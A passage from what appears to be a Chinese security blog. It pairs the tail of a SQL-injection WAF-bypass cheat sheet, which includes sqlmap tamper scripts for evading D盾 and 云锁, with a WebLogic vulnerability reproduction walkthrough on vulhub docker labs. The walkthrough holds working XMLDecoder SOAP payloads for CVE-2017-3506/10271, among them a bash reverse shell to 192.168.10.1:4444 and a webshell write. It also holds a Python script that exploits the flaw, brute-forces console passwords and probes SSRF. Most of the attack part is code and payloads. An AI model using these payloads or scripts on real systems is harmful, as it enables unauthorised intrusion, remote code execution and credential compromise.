<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">反引号，select `version()`，绕过空格和正则</span><br><span class="line">加号和点，&quot;+&quot;和&quot;.&quot;代表连接，也可绕过空格和关键字过滤</span><br><span class="line">@符号，用于定义变量，一个@代表用户变量，@@代表系统变量</span><br></pre></td></tr></table></figure>

<p>6.关键字拆分</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;se&#x27;+&#x27;lec&#x27;+&#x27;t&#x27;</span><br><span class="line">%S%E%L%C%T 1,2,3</span><br><span class="line">?id=1;EXEC(&#x27;ma&#x27;+&#x27;ster..x&#x27;+&#x27;p_cm&#x27;+&#x27;dsh&#x27;+&#x27;ell&quot;net user&quot;&#x27;)</span><br><span class="line">!和()：&#x27;or--+2=--!!!&#x27;2</span><br><span class="line">id=1+(UnI)(oN)+(SeL)(EcT)</span><br></pre></td></tr></table></figure>

<p>7.加括号绕过</p>
<p>小括号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union (select+1,2,3+from+users)%23</span><br><span class="line">union(select(1),(2),(3)from(users))</span><br><span class="line">id=(1)or(0x50=0x50)</span><br><span class="line">id=(-1)union(((((((select(1),hex(2),hex(3)from(users))))))))</span><br></pre></td></tr></table></figure>

<p>花括号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select&#123;x user&#125;from&#123;x mysql.user&#125;</span><br><span class="line">id=-1 union select 1,&#123;x 2&#125;,3</span><br></pre></td></tr></table></figure>

<p>8.过滤and和or下的盲注</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=strcmp(left((select%20username%20from%20users%20limit%200,1),1),0x42)%23</span><br><span class="line">id=strcmp(left((select+username+from+limit+0,1),1,0x42)%23</span><br></pre></td></tr></table></figure>

<p>9.白名单绕过</p>
<p>拦截信息：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /pen/news.php?id=1 union select user,password from mysql.user</span><br></pre></td></tr></table></figure>

<p>绕过：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /pen/news. php/admin?id=1 union select user,password from mysql. user</span><br><span class="line">GET /pen/admin/..\news. php?id=1 union select user,password from mysql. user</span><br></pre></td></tr></table></figure>

<p>10.HTTP参数控制</p>
<p>（1）HPP（HTTP Parmeter Polution）（重复参数污染）</p>
<p>举例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php?id=1 union select username,password from users</span><br><span class="line">index.php?id=1/**/union/*&amp;id=*/select/*&amp;id=*/username.password/*&amp;id=*/from/*&amp;id=*/users</span><br></pre></td></tr></table></figure>

<p>HPP又称作重复参数污染，最简单的是?uid&#x3D;1&amp;uid&#x3D;2&amp;uid&#x3D;3，对于这种情况，不用的web服务器处理方式不同。</p>
<p>具体WAF如何处理，要看设置的规则，不过示例中最后一个有较大可能绕过</p>
<p>（2）HPF（HTTP Parmeter Fragment）（HTTP分割注入）</p>
<p>HTTP分割注入，同CRLF有相似之处（使用控制字符%0a、%0d等执行换行）</p>
<p>举例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?a=1+union/*&amp;b=*/select+1,pass/*&amp;c=*/from+users--</span><br><span class="line">select * from table where a=1 union/* and b=*/select 1,pass/* limit */from users—</span><br></pre></td></tr></table></figure>

<p>11.burpsuite 插件分块传输</p>
<p><a href="https://github.com/c0ny1/chunked-coding-converter">https://github.com/c0ny1/chunked-coding-converter</a></p>
<h3 id="SQL注入防御"><a href="#SQL注入防御" class="headerlink" title="SQL注入防御"></a><strong>SQL注入防御</strong></h3><ol>
<li>对用户输入的内容进行转义</li>
<li>限制关键字的输入，如单引号、双引号、右括号等，限制输入的长度</li>
<li>使用 SQL 语句预处理，然后进行参数绑定，最后传入参数</li>
<li>添加 WAF、防火墙等。</li>
</ol>
<h3 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h3><p><strong>sqlmap bypass D盾 tamper</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"></span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line">def dependencies():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">            BYPASS Ddun</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    retVal = payload</span><br><span class="line">    if payload:</span><br><span class="line">        retVal = &quot;&quot; </span><br><span class="line">        quote, doublequote, firstspace = False, False, False</span><br><span class="line">        for i in xrange(len(payload)):</span><br><span class="line">            if not firstspace:</span><br><span class="line">                if payload[i].isspace():</span><br><span class="line">                    firstspace = True</span><br><span class="line">                    retVal += &quot;/*DJSAWW%2B%26Lt%3B%2B*/&quot;</span><br><span class="line">                    continue</span><br><span class="line">            elif payload[i] == &#x27;\&#x27;&#x27;:</span><br><span class="line">                quote = not quote</span><br><span class="line">            elif payload[i] == &#x27;&quot;&#x27;:</span><br><span class="line">                doublequote = not doublequote</span><br><span class="line">            elif payload[i] == &quot; &quot; and not doublequote and not quote:</span><br><span class="line">                retVal += &quot;/*DJSAWW%2B%26Lt%3B%2B*/&quot;</span><br><span class="line">                continue</span><br><span class="line">            retVal += payload[i]</span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>

<p><strong>sqlmap bypass 云锁 tamper</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)</span><br><span class="line">See the file &#x27;LICENSE&#x27; for copying permission</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">from lib.core.data import kb</span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line">from lib.core.common import singleTimeWarnMessage</span><br><span class="line">from lib.core.enums import DBMS</span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line">def dependencies():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">         payload=payload.replace(&#x27;ORDER&#x27;,&#x27;/*!00000order*/&#x27;)</span><br><span class="line">         payload=payload.replace(&#x27;ALL SELECT&#x27;,&#x27;/*!00000all*/ /*!00000select&#x27;)</span><br><span class="line">         payload=payload.replace(&#x27;CONCAT(&#x27;,&quot;CONCAT/**/(&quot;)</span><br><span class="line">         payload=payload.replace(&quot;--&quot;,&quot; */--&quot;)</span><br><span class="line">         payload=payload.replace(&quot;AND&quot;,&quot;%26%26&quot;)</span><br><span class="line">         return payload</span><br></pre></td></tr></table></figure>

<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://mp.weixin.qq.com/s/Hor7qN5XPRZuoxpOLQac3g">https://mp.weixin.qq.com/s/Hor7qN5XPRZuoxpOLQac3g</a></p>
]]></content>
      <categories>
        <category>漏洞总结</category>
      </categories>
      <tags>
        <tag>Sql</tag>
      </tags>
  </entry>
  <entry>
    <title>Weblogic 漏洞复现</title>
    <url>/posts/2eb29b89.html</url>
    <content><![CDATA[<h1 id="Weblogic漏洞复现"><a href="#Weblogic漏洞复现" class="headerlink" title="Weblogic漏洞复现"></a>Weblogic漏洞复现</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>本文将对一些常见的weblogic漏洞进行漏洞分析及复现，漏洞环境基于vulhub搭建，不分析原理，可以参考：<a href="https://mp.weixin.qq.com/s/KWZfA_JG3r0yAQCTlBkkBg">https://mp.weixin.qq.com/s/KWZfA_JG3r0yAQCTlBkkBg</a></p>
<p>GitHub 下载 vulhub 项目。</p>
<blockquote>
<p>环境：</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20211018124003412.png" alt="image-20211018124003412"></p>
<h2 id="0x01-弱口令"><a href="#0x01-弱口令" class="headerlink" title="0x01 弱口令"></a>0x01 弱口令</h2><blockquote>
<p>环境</p>
<p>weak_password</p>
<p>启动</p>
<p>docker-compose up -d </p>
</blockquote>
<p>访问目标：</p>
<p><a href="http://127.0.0.1:7001/console/">http://127.0.0.1:7001/console/</a></p>
<p>默认用户名、密码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用户名：weblogic</span><br><span class="line">密码：Oracle@123</span><br></pre></td></tr></table></figure>

<h2 id="0x02-getshell"><a href="#0x02-getshell" class="headerlink" title="0x02 getshell"></a>0x02 getshell</h2><blockquote>
<p>环境</p>
</blockquote>
<p>通用的全部版本</p>
<p>生成 <code>war</code> 包：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwd</span><br><span class="line">shell</span><br><span class="line">ls</span><br><span class="line">tomcat_shell.jsp</span><br><span class="line">jar -cvf Login.war ./</span><br><span class="line">ls</span><br><span class="line">Login.war tomcat_shell.jsp</span><br><span class="line">或者：</span><br><span class="line">zip Login.war tomcat_shell.jsp</span><br><span class="line">ls</span><br><span class="line">Login.war tomcat_shell.jsp</span><br></pre></td></tr></table></figure>

<p>登录后台后，点击左侧的部署：</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/Weblogic漏洞复现/image-20211018124443149.png" alt="image-20211018124443149" style="zoom: 50%;" />

<p>点击<code>安装</code></p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/Weblogic漏洞复现/image-20211018124524324.png" alt="image-20211018124524324" style="zoom:50%;" />

<p>点击<code>上传文件</code></p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/Weblogic漏洞复现/image-20211018131144677.png" alt="image-20211018131144677" style="zoom:50%;" />

<p>选择<code>Login.war</code> 包，下一步</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/Weblogic漏洞复现/image-20211018131317727.png" alt="image-20211018131317727" style="zoom:50%;" />

<p>下一步</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/Weblogic漏洞复现/image-20211018131403236.png" alt="image-20211018131403236" style="zoom:50%;" />

<p>部署为应用程序，下一步</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/Weblogic漏洞复现/image-20211018131431349.png" alt="image-20211018131431349" style="zoom:50%;" />

<p>全部默认即可，点击<code>完成</code></p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/Weblogic漏洞复现/image-20211018131544323.png" alt="image-20211018131544323" style="zoom:50%;" />

<p>部署成功，使用蚁剑getshell</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/Weblogic漏洞复现/image-20211018131628588.png" alt="image-20211018131628588" style="zoom:50%;" />

<h2 id="0x03-CVE-2017-3506"><a href="#0x03-CVE-2017-3506" class="headerlink" title="0x03 CVE-2017-3506"></a>0x03 CVE-2017-3506</h2><p>XMLDecoder反序列化漏洞(CVE-2017-3506)</p>
<blockquote>
<p>环境</p>
</blockquote>
<p>使用的<code>weak_password</code>环境weblogic的版本为10.3.6，也存在这个漏洞，所以继续使用这个docker</p>
<blockquote>
<p>漏洞原理</p>
</blockquote>
<p>参考链接：<a href="https://mp.weixin.qq.com/s/KWZfA_JG3r0yAQCTlBkkBg">https://mp.weixin.qq.com/s/KWZfA_JG3r0yAQCTlBkkBg</a></p>
<blockquote>
<p>复现</p>
</blockquote>
<p>访问以下目录中的一种，有回显如下图可以判断wls-wsat组件存在</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/wls-wsat/CoordinatorPortType</span><br><span class="line">/wls-wsat/RegistrationPortTypeRPC</span><br><span class="line">/wls-wsat/ParticipantPortType</span><br><span class="line">/wls-wsat/RegistrationRequesterPortType</span><br><span class="line">/wls-wsat/CoordinatorPortType11</span><br><span class="line">/wls-wsat/RegistrationPortTypeRPC11</span><br><span class="line">/wls-wsat/ParticipantPortType11</span><br><span class="line">/wls-wsat/RegistrationRequesterPortType11</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20211018133158829.png" alt="image-20211018133158829"></p>
<p>在当前页面抓包：</p>
<p>POC:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1</span><br><span class="line">Host: 192.168.10.1:7001</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Type: text/xml;charset=UTF-8</span><br><span class="line">Content-Length: 1120</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; </span><br><span class="line">            &lt;soapenv:Header&gt;</span><br><span class="line">                &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">                    &lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">                        &lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">                            &lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</span><br><span class="line">                                &lt;void index=&quot;0&quot;&gt;</span><br><span class="line">                                    &lt;string&gt;/bin/bash&lt;/string&gt;</span><br><span class="line">                                &lt;/void&gt;</span><br><span class="line">                                &lt;void index=&quot;1&quot;&gt;</span><br><span class="line">                                    &lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">                                &lt;/void&gt;</span><br><span class="line">                                &lt;void index=&quot;2&quot;&gt;</span><br><span class="line"> &lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.10.1/4444 0&amp;gt;&amp;amp;1&lt;/string&gt;</span><br><span class="line">                                &lt;/void&gt;</span><br><span class="line">                            &lt;/array&gt;</span><br><span class="line">                        &lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;</span><br><span class="line">                    &lt;/java&gt;</span><br><span class="line">                &lt;/work:WorkContext&gt;</span><br><span class="line">            &lt;/soapenv:Header&gt;</span><br><span class="line">        &lt;soapenv:Body/&gt;</span><br><span class="line">        &lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure>

<p>写马，马是蚁剑的不行，好像必须是冰蝎的：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span><br><span class="line">&lt;soapenv:Header&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">&lt;java&gt;</span><br><span class="line">&lt;java version=&quot;1.6.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">&lt;object class=&quot;java.io.PrintWriter&quot;&gt;</span><br><span class="line">&lt;string&gt;servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/test.jsp&lt;/string&gt;&lt;void method=&quot;println&quot;&gt;</span><br><span class="line">&lt;string&gt;bingxiema</span><br><span class="line">&lt;/string&gt;&lt;/void&gt;&lt;void method=&quot;close&quot;/&gt;</span><br><span class="line">&lt;/object&gt;</span><br><span class="line">&lt;/java&gt;</span><br><span class="line">&lt;/java&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body/&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure>

<p>因为不太懂 <code>java</code> ，所以直接上可以反弹 shell 的检测脚本和利用脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># !/usr/bin/env python           </span><br><span class="line"># coding  : utf-8 </span><br><span class="line"># Date    : 2018-04-03 19:08:00</span><br><span class="line"># Author  : b4zinga</span><br><span class="line"># Email   : b4zinga@outlook.com</span><br><span class="line"># Function: weblogic vuln</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class WebLogic:</span><br><span class="line">    def __init__(self, url):</span><br><span class="line">        if &#x27;://&#x27; not in url:</span><br><span class="line">            url = &#x27;http://&#x27; + url</span><br><span class="line">        self.url = url.strip(&#x27;/&#x27;)</span><br><span class="line"></span><br><span class="line">    def xmlDecoder(self):</span><br><span class="line">        &quot;&quot;&quot;Version:10.3.6.0.0/12.1.3.0.0/12.2.1.1.0</span><br><span class="line">        CVE-2017-10271</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        headers = &#123;</span><br><span class="line">            &quot;Content-Type&quot;:&quot;text/xml;charset=UTF-8&quot;,</span><br><span class="line">            &quot;User-Agent&quot;:&quot;Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50&quot;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        # &lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.10.1/4444 0&amp;gt;&amp;amp;1&lt;/string&gt;</span><br><span class="line">        xml = &quot;&quot;&quot;</span><br><span class="line">        &lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; </span><br><span class="line">            &lt;soapenv:Header&gt;</span><br><span class="line">                &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">                    &lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">                        &lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">                            &lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</span><br><span class="line">                                &lt;void index=&quot;0&quot;&gt;</span><br><span class="line">                                    &lt;string&gt;/bin/bash&lt;/string&gt;</span><br><span class="line">                                &lt;/void&gt;</span><br><span class="line">                                &lt;void index=&quot;1&quot;&gt;</span><br><span class="line">                                    &lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">                                &lt;/void&gt;</span><br><span class="line">                                &lt;void index=&quot;2&quot;&gt;</span><br><span class="line">                                &lt;string&gt;id &gt; /tmp/b4&lt;/string&gt;</span><br><span class="line">                                &lt;/void&gt;</span><br><span class="line">                            &lt;/array&gt;</span><br><span class="line">                        &lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;</span><br><span class="line">                    &lt;/java&gt;</span><br><span class="line">                &lt;/work:WorkContext&gt;</span><br><span class="line">            &lt;/soapenv:Header&gt;</span><br><span class="line">        &lt;soapenv:Body/&gt;</span><br><span class="line">        &lt;/soapenv:Envelope&gt;&quot;&quot;&quot;</span><br><span class="line">        req = requests.post(self.url+&quot;:7001/wls-wsat/CoordinatorPortType&quot;, headers=headers, data=xml)</span><br><span class="line">        if req.status_code == 500 :</span><br><span class="line">            print(&#x27;[+] WebLogic xml decoder &#x27;)</span><br><span class="line">            # print(req.text)</span><br><span class="line"></span><br><span class="line">    def weakPasswd(self):</span><br><span class="line">        &quot;&quot;&quot;weak password&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">        pwddict = [&#x27;WebLogic&#x27;, &#x27;weblogic&#x27;, &#x27;Oracle@123&#x27;, &#x27;password&#x27;, &#x27;system&#x27;, &#x27;Administrator&#x27;, &#x27;admin&#x27;, &#x27;security&#x27;, &#x27;joe&#x27;, &#x27;wlcsystem&#x27;, &#x27;wlpisystem&#x27;]</span><br><span class="line">        for user in pwddict:</span><br><span class="line">            for pwd in pwddict:</span><br><span class="line">                data = &#123;</span><br><span class="line">                    &#x27;j_username&#x27;:user,</span><br><span class="line">                    &#x27;j_password&#x27;:pwd,</span><br><span class="line">                    &#x27;j_character_encoding&#x27;:&#x27;UTF-8&#x27;</span><br><span class="line">                &#125;</span><br><span class="line">                req = requests.post(self.url+&#x27;:7001/console/j_security_check&#x27;, data=data, allow_redirects=False, verify=False)</span><br><span class="line"></span><br><span class="line">                if req.status_code == 302 and &#x27;console&#x27; in req.text and &#x27;LoginForm.jsp&#x27; not in req.text:</span><br><span class="line">                    print(&#x27;[+] WebLogic username: &#x27;+user+&#x27;  password: &#x27;+pwd)</span><br><span class="line"></span><br><span class="line">    def ssrf(self):</span><br><span class="line">        &quot;&quot;&quot;Version: 10.0.2/10.3.6</span><br><span class="line">        CVE-2014-4210&quot;&quot;&quot;</span><br><span class="line">        # payload = &quot;:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:7001&quot;</span><br><span class="line">        payload = &quot;:7001/uddiexplorer/SearchPublicRegistries.jsp?operator=http://localhost/robots.txt&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&quot;</span><br><span class="line"></span><br><span class="line">        req = requests.get(self.url+payload, timeout=10, verify=False)</span><br><span class="line">        if &quot;weblogic.uddi.client.structures.exception.XML_SoapException&quot; in req.text and &quot;IO Exception on sendMessage&quot; not in req.text:</span><br><span class="line">            print(&quot;[+] WebLogic ssrf&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    url = &#x27;192.168.10.1&#x27;</span><br><span class="line">    wls = WebLogic(url)</span><br><span class="line"></span><br><span class="line">    wls.xmlDecoder()</span><br><span class="line">    wls.weakPasswd()</span><br><span class="line">    wls.ssrf()</span><br></pre></td></tr></table></figure>

<p>只需要将第 41 行的内容替换为第 26 行的内容，然后 <code>nc -lvnp 4444</code> ，运行exp，即可接收反弹的shell。</p>
<blockquote>
<p>第一次运行脚本会提示用户名和密码，但是接下来一会都不会提示，因为用户的密码错误5次后，该账户就会被锁定。</p>
</blockquote>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/Weblogic漏洞复现/image-20211018144308113.png" alt="image-20211018144308113" style="zoom:50%;" />

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20211018144320272.png" alt="image-20211018144320272"></p>
<h2 id="0x04-CVE-2017-10271"><a href="#0x04-CVE-2017-10271" class="headerlink" title="0x04 CVE-2017-10271"></a>0x04 CVE-2017-10271</h2><p>XMLDecoder反序列化漏洞(CVE-2017-10271)</p>
<blockquote>
<p>漏洞原理</p>
</blockquote>
<p>在CVE-2017-3506之前，不对payload进行验证，使用object tag可以RCE，CVE-2017-3506的补丁在<code>weblogic/wsee/workarea/WorkContextXmlInputAdapter.java</code>中添加了validate方法，在解析xml时，Element字段出现object tag就抛出运行时异常，不过这次防护力度不够，导致了CVE-2017-10271，利用方式类似，使用了void tag进行RCE，于是CVE-2017-10271的补丁将object、new、method关键字加入黑名单，针对void和array这两个元素是有选择性的抛异常，其中当解析到void元素后，还会进一步解析该元素中的属性名，若没有匹配上index关键字才会抛出异常。而针对array元素而言，在解析到该元素属性名匹配class关键字的前提下，还会解析该属性值，若没有匹配上byte关键字，才会抛出运行时异常。总之，这次的补丁基本上限定了不能生成java实例。</p>
<blockquote>
<p>漏洞复现</p>
</blockquote>
<p>上面复现 CVE-2017-10271 的过程中，用到的脚本实际上是针对 10271 的，所以遇到了直接反弹shell即可。</p>
<h2 id="0x05-CVE-2019-2725"><a href="#0x05-CVE-2019-2725" class="headerlink" title="0x05 CVE-2019-2725"></a>0x05 CVE-2019-2725</h2><p>wls-wsat反序列化漏洞(CVE-2019-2725)。攻击者可以发送精心构造的恶意HTTP请求，在未授权的情况下远程执行命令</p>
<blockquote>
<p>漏洞原理</p>
</blockquote>
<p>漏洞触发点：bea_wls9_async_response.war、wsat.war</p>
<p>影响版本：Oracle WebLogic Server 10.* 、Oracle WebLogic Server 12.1.3</p>
<p>通过CVE-2019-2725补丁分析发现，较上一个漏洞CVE-2017-10271补丁而言，官方新增了对class元素的过滤，并且array元素的length属性转换为整形后不得大于10000：</p>
<p>本次漏洞利用某个元素成功替换了补丁所限制的元素，再次绕过了补丁黑名单策略，最终造成远程命令执行。</p>
<blockquote>
<p>环境搭建</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull ismaleiva90/weblogic12</span><br><span class="line"></span><br><span class="line">docker run -d -p 7001:7001 -p 7002:7002 -p 5556:5556 ismaleiva90/weblogic12:latest</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost:7001/console</span><br><span class="line"></span><br><span class="line">User: weblogic</span><br><span class="line"></span><br><span class="line">Pass: welcome1</span><br></pre></td></tr></table></figure>

<blockquote>
<p>漏洞复现</p>
</blockquote>
<p>访问以下目录中的一种，如下图所示则漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/_async/AsyncResponseService</span><br><span class="line">/_async/AsyncResponseServiceJms</span><br><span class="line">/_async/AsyncResponseServiceHttps</span><br><span class="line">/_async/AsyncResponseServiceSoap12</span><br><span class="line">/_async/AsyncResponseServiceSoap12Jms</span><br><span class="line">/_async/AsyncResponseServiceSoap12Https</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20211018231037613.png" alt="image-20211018231037613"></p>
<p>没有复现成功，只成功利用了 exp：</p>
<p>exp地址：<a href="https://github.com/TopScrew/CVE-2019-2725">https://github.com/TopScrew/CVE-2019-2725</a></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20211019003843176.png" alt="image-20211019003843176"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20211019003810753.png" alt="image-20211019003810753"></p>
<h2 id="0x06-CVE-2018-2628"><a href="#0x06-CVE-2018-2628" class="headerlink" title="0x06 CVE-2018-2628"></a>0x06 CVE-2018-2628</h2><p>WebLogic T3协议反序列化命令执行漏洞(CVE-2018-2628)。Oracle WebLogic Server的T3通讯协议的实现中存在反序列化漏洞。远程攻击者通过T3协议在Weblogic Server中执行反序列化操作，利用RMI（远程方法调用） 机制的缺陷，通过 JRMP 协议（Java远程方法协议）达到执行任意反序列化代码，进而造成远程代码执行</p>
<p>同为WebLogic T3引起的反序列化漏洞还有CVE-2015-4852、CVE-2016-0638、CVE-2016-3510、CVE-2017-3248、CVE-2018-2893、CVE-2016-0638</p>
<blockquote>
<p>漏洞原理</p>
</blockquote>
<p>在InboundMsgAbbrev中resolveProxyClass中，resolveProxyClass是处理rmi接口类型的，只判断了java.rmi.registry.Registry，这就会导致任意一个rmi接口都可绕过。核心部分就是JRMP（Java Remote Method protocol），在这个PoC中会序列化一个RemoteObjectInvocationHandler，它会利用UnicastRef建立到远端的tcp连接获取RMI registry，加载回来再利用readObject解析，从而造成反序列化远程代码执行。</p>
<blockquote>
<p>漏洞复现</p>
</blockquote>
